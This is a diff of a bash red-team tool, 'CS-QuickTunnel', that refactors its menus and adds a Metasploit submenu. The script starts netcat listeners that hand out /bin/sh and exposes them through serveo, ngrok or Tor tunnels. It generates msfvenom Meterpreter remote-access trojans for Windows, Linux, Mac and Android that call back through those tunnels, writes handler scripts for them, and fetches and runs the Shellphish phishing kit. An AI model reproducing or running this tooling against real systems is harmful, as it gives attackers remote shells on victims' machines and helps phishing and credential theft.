@@ -1,5 +1,5 @@
 #!/bin/bash
-# CS-QuickTunnel v.0.6.8
+# CS-QuickTunnel v.0.6.9
 # Coded by: Cyber Secrets - Information Warfare Center
 # Tool for Red Team ops
 # Github: https://github.com/infosecwriter/CS-QuickTunnel
@@ -10,19 +10,20 @@
 
 trap 'printf "\n";stop;exit 1' 2
 clear
+OSType=""
+default_port="12345"
 
 startmenu() {
 	banner
-	default_port="12345"
-	default_server="serveo.net"
 	printf "\e[92m  SSH Reverse Tunneling                                      =  1\n"
 	printf "  NGROK Reverse Tunneling                                    =  2\n"
 	if command -v tor > /dev/null 2>&1; then
 		printf "  TOR Reverse Tunneling & Hidden Service                     =  3\n"
 	fi
-	printf "  SOCAT Reverse Tunneling Proxy                              =  8\n"
-	printf "  Check Dependencies                                         =  9\n"
-	printf "  Run Shellphish @thelinuxchoice                             = 10\n"
+	printf "  SOCAT Reverse Tunneling Proxy                              = 10\n"
+	printf "  Run Meterpreter reverse tunnels                            = 20\n"
+	printf "  Run Shellphish @thelinuxchoice                             = 30\n"
+	printf "  Check Dependencies                                         = 90\n"
 	printf "  Exit                                                       = 99\n"
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
@@ -40,10 +41,26 @@ startmenu() {
 		3|03)
 			menutor
 			;;
-		8|08)
+		10)
 			menusocat
 			;;
-		9|09)
+		20)
+			menumetasploit
+			;;
+		30)
+			if [ -d shellphish ]; then 
+				cd shellphish
+				git pull
+			else 
+				git clone https://github.com/thelinuxchoice/shellphish
+				cd shellphish	
+			fi
+			sleep 3
+			clear
+			bash shellphish.sh
+			startmenu
+			;;
+		90)
 			printf "\e[93mChecking dependencies"
 			apt update | tee -a dep.log
 			command -v unzip > /dev/null 2>&1 || { apt install unzip | tee -a dep.log; }
@@ -62,19 +79,6 @@ startmenu() {
 			read depme
 			startmenu
 			;; 
-		10)
-			if [ -d shellphish ]; then 
-				cd shellphish
-				git pull
-			else 
-				git clone https://github.com/thelinuxchoice/shellphish
-				cd shellphish	
-			fi
-			sleep 3
-			clear
-			bash shellphish.sh
-			startmenu
-			;;
   		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		clear
@@ -85,44 +89,33 @@ startmenu() {
 
 menussh() {
 	banner
-	default_port="12345"
-	default_server="serveo.net"
 	printf "\e[92m  Reverse tunnel                                             =  1\n"
 	printf "  Run a NetCat listener reverse tunnel                       =  2\n"
 	printf "  Run a NetCat listener reverse connect - reverse tunnel     =  3\n"
 	printf "  Run a NoMachine listener reverse tunnel                    =  4\n"
 	printf "  Run a VNC listener reverse tunnel                          =  5\n"
 	printf "  Run PHP Server Through a Serveo.net reverse tunnel         = 10\n"	
-	printf "\n  Meterpreter reverse tunnels\n"
-	if command -v msfconsole > /dev/null 2>&1; then
-		printf "  [*] Run a Metasploit Meterpreter (Windows) listener        = 21\n"
-		printf "  [*] Run a Metasploit Meterpreter (Linux) listener          = 22\n"
-		printf "  [*] Run a Metasploit Meterpreter (Mac) listener            = 23\n"
-		printf "  [*] Run a Metasploit Meterpreter (Android) listener        = 24\n"
-	fi
 	printf "  Exit                                                       = 99\n"
 	printf "\n"
-
 	read -p $'  Choose an option: \e[37;1m' option
+
 	if [[ $option == 99 ]]; then 
 		startmenu
 	fi
-	printf '\e[92mChoose a local listening port (Example:12345)\e[37;1m: ' $default_port
-	read lport; lport="${lport:-${default_port}}"
-	printf '\e[92mChoose a remote SSH server to reverse tunnel from (Example: serveo.net)\e[37;1m: ' $default_server
-	read rserver; rserver="${rserver:-${default_server}}"
-	printf '\e[92mChoose a remote port on the SSH server (Example:12345)\e[37;1m: ' $default_port
-	read rport; rport="${rport:-${default_port}}"
 	case $option in
 		1|01)      
+			lip
 			printf "\e[1;93m [!] Reverse tunnel from $remote to localhost port $lport\e[0m\n"
 			serveoitforward
 			;;
 		2|02)      
+			lip			
 			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
+			serveoitforward
 			menussh
 			;;
-		3|03)      
+		3|03)   
+			lip   
 			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			nc -lvp -p $lport -e /bin/sh > /dev/null 2>&1 &
 			serveoitforward
@@ -133,50 +126,15 @@ menussh() {
 			nomachineme
 			serveoitforward
 			;;
-		5|05)      
-			printf "\e[1;93m [!] Starting Nomachine on port"$lport"!\e[0m\n"
+		5|05)   
+			lip
+			printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
 			vncserver -rfbport $lport
 			serveoitforward
 			;;
-		10)      
+		10)     
+			lip 
 			serveserveo
-			;;
-	# Metasploit
-		21)      
-			payload="windows/meterpreter/reverse_tcp"
-			platform="-a x86 --platform windows"
-			filetype="-f exe"
-			fileext="exe"
-			OSType="Windows"
-			MetasploitMe
-			serveoitforward
-			;;
-		22)      
-			payload="linux/x86/meterpreter/reverse_tcp"
-			platform=""
-			filetype="-f elf"
-			fileext="elf"
-			OSType="Linux"
-			MetasploitMe
-			serveoitforward
-			;;
-		23)      
-			payload="osx/x86/shell_reverse_tcp"
-			platform=""
-			filetype="-f macho"
-			fileext="macho"
-			OSType="Mac"
-			MetasploitMe
-			serveoitforward
-			;;
-		24)      
-			payload="android/meterpreter/reverse_tcp"
-			platform=""
-			filetype="R"
-			fileext="apk"
-			OSType="Android"
-			MetasploitMe
-			serveoitforward
 			;;
 		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -190,40 +148,32 @@ menussh() {
 
 menungrok() {
 	banner
-	default_port="12345"
 	printf "\e[92m  Reverse Tunneling through Ngrok.io                         =  1\n"
 	printf "  Run a NetCat listener  reverse tunnels                     =  2\n"
 	printf "  Run a NetCat listener reverse conect -  reverse tunnels    =  3\n"
 	printf "  Run a NoMachine listener reverse tunnel                    =  4\n"
 	printf "  Run a VNC listener reverse tunnel                          =  5\n"
 	printf "  Run PHP Server Through Ngrok.io  reverse tunnels           = 10\n"
-	printf "\n  Meterpreter reverse tunnels\n"
-	if command -v msfconsole > /dev/null 2>&1; then
-		printf "  [*] Run a Metasploit Meterpreter (Windows) listener        = 21\n"
-		printf "  [*] Run a Metasploit Meterpreter (Linux) listener          = 22\n"
-		printf "  [*] Run a Metasploit Meterpreter (Mac) listener            = 23\n"
-		printf "  [*] Run a Metasploit Meterpreter (Android) listener        = 24\n"
-	fi
 	printf "  Exit                                                       = 99\n"
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
 	if [[ $option == 99 ]]; then 
 		startmenu
 	fi
-	printf 'Choose a local listening port (Example:12345): ' $default_server
-	read lport
-	lport="${lport:-${default_port}}"
 	case $option in
 		1|01)      
+			lip
 			printf "\e[1;93m [!] Reverse tunnel from $remote to localhost port $lport\e[0m\n"
 			ngrokitforward
 			;;
 		2|02)      
+			lip
 			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
 			ngrokitforward
 			;;
 		3|03)      
+			lip
 			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			nc -lvp $lport -e /bin/sh > /dev/null 2>&1 &
 			ngrokitforward
@@ -235,50 +185,15 @@ menungrok() {
 			ngrokitforward
 			;;
 		5|05)      
+			lip			
 			printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
 			vncserver -rfbport $lport
 			ngrokitforward
 			;;
 		10)      
+			lip			
 			printf "\e[1;93m [!] Starting PHP Server on port: "$lport"!\e[0m\n"
 			servengrok
-			;;
-	# Metasploit
-		21)      
-			payload="windows/meterpreter/reverse_tcp"
-			platform="-a x86 --platform windows"
-			filetype="-f exe"
-			fileext="exe"
-			OSType="Windows"
-			MetasploitMe
-			ngrokitforward
-			;;
-		22)      
-			payload="linux/x86/meterpreter/reverse_tcp"
-			platform=""
-			filetype="-f elf"
-			fileext="elf"
-			OSType="Linux"
-			MetasploitMe
-			ngrokitforward
-			;;
-		23)      
-			payload="osx/x86/shell_reverse_tcp"
-			platform=""
-			filetype="-f macho"
-			fileext="macho"
-			OSType="Mac"
-			MetasploitMe
-			ngrokitforward
-			;;
-		24)      
-			payload="android/meterpreter/reverse_tcp"
-			platform=""
-			filetype="R"
-			fileext="apk"
-			OSType="Android"
-			MetasploitMe
-			ngrokitforward
 			;;
 		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -292,8 +207,6 @@ menungrok() {
 
 menutor() {
 	banner
-	default_port="12345"
-	default_server="serveo.net"
 	printf "\e[92m  Tor Hidden Service - Reverse Tunnel                        =  1\n"
 	printf "  Run a NetCat listener  reverse tunnels                     =  2\n"
 	printf "  Run a NetCat listener reverse conect -  reverse tunnels    =  3\n"
@@ -308,28 +221,38 @@ menutor() {
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
 	printf "\n"
+
 	if [[ $option == 99 ]]; then 
 		startmenu
 	fi
+
 	case $option in
 		1|01)      
-			printf '\e[92mChoose a listening port (Example:12345): \e[37;1m' $default_port
-			read lport
-			toritforward
+			toritforward 
 			;;
-
+		2|02)      
+			toritforward
+			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
+			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
+			menutor
+			;;
+		3|03)    
+			toritforward  
+			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
+			echo "nc -lvp $lport -e /bin/sh > /dev/null 2>&1 &" nc.sh
+			hash nc.sh
+			menutor
+			;;
 		4|04)      
 			lport="4000"
-			printf "\e[1;93m [!] Starting Nomachine on port"$lport"!\e[0m\n"
-			nomachineme
 			toritforward
+			nomachineme
 			;;
 		5|05)      
-			printf '\e[92mChoose a listening port (Example:12345): \e[37;1m' $default_port
-			read lport
 			printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
-			vncserver -rfbport $lport
+	
 			toritforward
+			vncserver -rfbport $lport
 			;;
 		10)      
 			printf "\e[1;93m [!] Starting PHP Server on port \e[37;1m"$lport"!\n"
@@ -378,11 +301,8 @@ menutor() {
 	esac
 }
 
-
 menusocat() {
 	banner
-	default_port="12345"
-	default_server="serveo.net"
 	printf "\e[92m  SSH Reverse Tunnel Proxy                                   =  1\n"
 	printf "  NGROK Reverse Tunnel Proxy                                 =  2\n"
 	printf "  Tor Reverse Tunnel Proxy                                   =  3\n"
@@ -396,8 +316,7 @@ menusocat() {
 	rserver="serveo.net"
 	default_rrserver="towel.blinkenlights.nl"
 	default_rrport="23"
-	printf '\e[92mChoose a local listening port (Example:12345)\e[37;1m: ' $default_port
-	read lport; lport="${lport:-${default_port}}"
+	lip
 	printf '\e[92mChoose a remote server to forward/pivot to (Example:Server Name)\e[37;1m: ' $default_rrserver
 	read rrserver; rrserver="${rrserver:-${default_rrserver}}"
 	printf '\e[92mChoose a remote port to forward/pivot to (Example:12345)\e[37;1m: ' $default_rrport
@@ -405,11 +324,7 @@ menusocat() {
 	socatitforward
 	case $option in
 		1|01)      
-			printf '\e[92mChoose a reverse tunnel port to pivot from (Example:12345)\e[37;1m: ' $default_port
-			read rport; rport="${rport:-${default_port}}"
-			printf "\n"
 			serveoitforward
-			menussh
 			menusocat
 			;;
 		2|02)  
@@ -418,7 +333,6 @@ menusocat() {
 			;;
 		3|03)      
 			toritforward
-			read me
 			menusocat
 			;;
 		*)
@@ -430,13 +344,99 @@ menusocat() {
 	esac
 }
 
+menumetasploit() {
+	banner
+	printf "\e[92m  *** Meterpreter reverse tunnels ***\n"
+	printf "  [*] Run through SSH                                        =  1\n"
+	printf "  [*] Run through Ngrok                                      =  2\n"
+#	printf "  [*] Run through Tor                                        =  3\n"
+	printf "  Exit                                                       = 99\n"
+	printf "\n"
+	read -p $'  Choose an option: \e[37;1m' tunoption
+	if [[ $tunoption == 99 ]]; then 
+		startmenu
+	fi
+	case $tunoption in
+		1|01)      
+			tunnel="serveoitforward"
+			;;
+		2|02)      
+			tunnel="ngrokitforward"
+			;;
+		3|03)      
+			tunnel="toritforward"
+			;;
+		*)
+		printf "\e[1;93m [!] Invalid option!\e[0m\n"
+		sleep 1
+		menumetasploit
+		;;
+	esac
+		
+	printf "\e[92m  [*] Run a Metasploit Meterpreter (Windows) listener        =  1\n"
+	printf "  [*] Run a Metasploit Meterpreter (Linux) listener          =  2\n"
+	printf "  [*] Run a Metasploit Meterpreter (Mac) listener            =  3\n"
+	printf "  [*] Run a Metasploit Meterpreter (Android) listener        =  4\n"
+	printf "  Exit                                                       = 99\n"
+	printf "\n"
+	read -p $'  Choose an option: \e[37;1m' option
+	if [[ $tunoption == 99 ]]; then 
+		startmenu
+	fi
+	printf 'Choose a local listening port (Example:12345): ' $default_server
+	read lport
+	lport="${lport:-${default_port}}"
+	case $option in
+		1|01)      
+			payload="windows/meterpreter/reverse_tcp"
+			platform="-a x86 --platform windows"
+			filetype="-f exe"
+			fileext="exe"
+			OSType="Windows"
+			$tunnel
+			;;
+		2|02)      
+			payload="linux/x86/meterpreter/reverse_tcp"
+			platform=""
+			filetype="-f elf"
+			fileext="elf"
+			OSType="Linux"
+			$tunnel
+			;;
+		3|03)      
+			payload="osx/x86/shell_reverse_tcp"
+			platform=""
+			filetype="-f macho"
+			fileext="macho"
+			OSType="Mac"
+			$tunnel
+			;;
+		4|04)      
+			payload="android/meterpreter/reverse_tcp"
+			platform=""
+			filetype="R"
+			fileext="apk"
+			OSType="Android"
+			$tunnel
+			;;
+		*)
+		startmenu
+		;;
+	esac
+}
+
+lip() {
+	printf 'Choose a local listening port (Example:12345): ' $default_server
+	read lport
+	lport="${lport:-${default_port}}"
+}
 
 MetasploitMe() {
 	read -p $'\e[92mChoose RAT name with ".'$fileext'" extention: ' pname
 	printf "\e[1;93m [!] Starting Metasploit Meterpreter ($OSType) listener on port "$lport"!\e[0m\n"
 	rm -rf reverse-connect.sh
 	echo 'msfconsole -x "use exploit/multi/handler; set payload '$payload'; set LPORT '$lport'; set LHOST 127.0.0.1; run;"' > reverse-connect.sh
-	printf "\e[1;93m [!] To create a meterpreter RAT, RUN \n msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $file > $pname\n"
+	printf "\e[1;93m [!] To create a meterpreter RAT, RUN \n msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $filetype > $pname\n"
 	printf " \e[92mCopy "$pname" to the remote $OSType system \n Then run "$pname"!\n"
 	mkdir site/installs > /dev/null 2>&1
 	service postgresql stop > /dev/null 2>&1
@@ -445,13 +445,12 @@ MetasploitMe() {
 	msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $filetype > site/installs/$pname
 	chmod +x site/installs/$pname
 	chmod +x reverse-connect.sh
-	printf "Starting Metasploit with $payload listener..."
+	printf "Starting Metasploit with $payload listener...\n"
 	xterm ./reverse-connect.sh &
-
 }
 
 nomachineme() {
-	if [[ -e nomachine_*_amd64.deb ]]; then
+	if [[ -f nomachine_6.3.6_1_amd64.deb ]]; then
 		printf ""
 	else
 		wget https://download.nomachine.com/download/6.3/Linux/nomachine_6.3.6_1_amd64.deb
@@ -574,13 +573,28 @@ toritforward() {
 	hostname=$(cat /var/lib/tor/myservices/hostname)
 	printf "Here is the path to fortune: \e[37;1m$hostname:$lport\n"
 	timex
-	printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
-	echo 'torsocks nc '$hostname $lport > reverse-tor-connect.sh
-	chmod +x reverse-tor-connect.sh
-	xterm ./reverse-tor-connect.sh &
+	if  [[ ! -z "$tunnel" ]]; then
+		rserver=$hostname
+		rport=$lport
+		MetasploitMe
+	fi
+	if [[ $OSType == "Linux" ]]; then
+		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
+		if [[ $testme == "y" || $testme == "Y" ]]; then
+			echo "torsocks ./site/installs/$pname" > testme.sh
+			bash testme.sh &
+		fi
+	else
+		printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
+		echo 'torsocks nc '$hostname $lport > reverse-tor-connect.sh
+		echo 'nc '$rserver $rport > reverse-ngrok-connect.sh
+		chmod +x reverse-ngrok-connect.sh
+		xterm ./reverse-ngrok-connect.sh &
+	fi
+
+
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
-	menutor
 }
 
 ngrokitforward() {
@@ -591,9 +605,20 @@ ngrokitforward() {
 	rserver="tcp.ngrok.io"
 	printf "\e[1;92m[\e[0m*\e[1;92m] Your new server:\e[0m\e[1;77m %s\e[0m\n" $rserver:$rport
 	printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
-	echo 'nc '$rserver $rport > reverse-ngrok-connect.sh
-	chmod +x reverse-ngrok-connect.sh
-	xterm ./reverse-ngrok-connect.sh &	
+	if  [[ ! -z "$tunnel" ]]; then
+		MetasploitMe
+	fi
+	if [[ $OSType == "Linux" ]]; then
+		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
+		if [[ $testme == "y" || $testme == "Y" ]]; then
+			echo "./site/installs/$pname" > testme.sh
+			bash testme.sh &
+		fi
+	else
+		echo 'nc '$rserver $rport > reverse-ngrok-connect.sh
+		chmod +x reverse-ngrok-connect.sh
+		xterm ./reverse-ngrok-connect.sh &
+	fi
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
 	menungrok
@@ -601,24 +626,30 @@ ngrokitforward() {
 
 socatitforward() {
 	socat tcp-listen:$lport,reuseaddr,fork TCP:$rrserver:$rrport &
-	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
-	read me
-	menusocat
 }
 
 serveoitforward() {
+	default_server="serveo.net"
+	printf '\e[92mChoose a remote SSH server to reverse tunnel from (Example: serveo.net)\e[37;1m: ' $default_server
+	read rserver; rserver="${rserver:-${default_server}}"
+	printf '\e[92mChoose a remote port on the SSH server (Example:12345)\e[37;1m: ' $default_port
+	read rport; rport="${rport:-${default_port}}"
+	if  [[ ! -z "$tunnel" ]]; then
+		MetasploitMe
+	fi
 	if [[ $OSType == "Linux" ]]; then
-11		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
+		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
 		if [[ $testme == "y" || $testme == "Y" ]]; then
 			echo "./site/installs/$pname" > testme.sh
 			bash testme.sh &
 		fi
+	else
+		printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
+		echo 'sleep 5; nc '$rserver $rport > reverse-serveo-connect.sh
+		chmod +x reverse-serveo-connect.sh
+		xterm ./reverse-serveo-connect.sh &
 	fi
 	printf "\e[92mStarting tunnel...\e[0m\n"
-	printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
-	echo 'sleep 5; nc '$rserver $rport > reverse-ngrok-connect.sh
-	chmod +x reverse-ngrok-connect.sh
-	xterm ./reverse-ngrok-connect.sh &
 	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $rport:localhost:$lport $rserver
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
@@ -654,7 +685,9 @@ servengrok() {
 	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
 	sleep 2
 	printf "\e[92mStarting ngrok server...\n"
-	./ngrok http $lport > /dev/null 2>&1 & sleep 10 && link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
+	./ngrok http $lport > /dev/null 2>&1
+	sleep 10
+	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
 	printf "\e[92mYour new server: \e[37;1m$link\n" 
 	printf "\e[92mOpening with Firefox in 3 seconds\n"
 	sleep 3 
